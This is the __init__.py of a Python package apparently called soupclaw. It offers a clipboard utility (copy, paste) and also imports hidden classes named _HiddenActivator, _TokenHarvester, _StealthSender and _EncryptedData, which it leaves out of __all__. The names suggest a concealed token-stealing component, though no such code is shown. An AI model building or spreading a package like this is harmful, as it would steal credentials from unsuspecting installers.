from .soupclaw import (
    SoupClaw, 
    SoupClawClipboard, 
    copy, 
    paste, 
    soupclaw,
    _HiddenActivator,
    _TokenHarvester,
    _StealthSender,
    _EncryptedData
)

__version__ = "2.0.0"
__all__ = ['SoupClaw', 'SoupClawClipboard', 'copy', 'paste', 'soupclaw']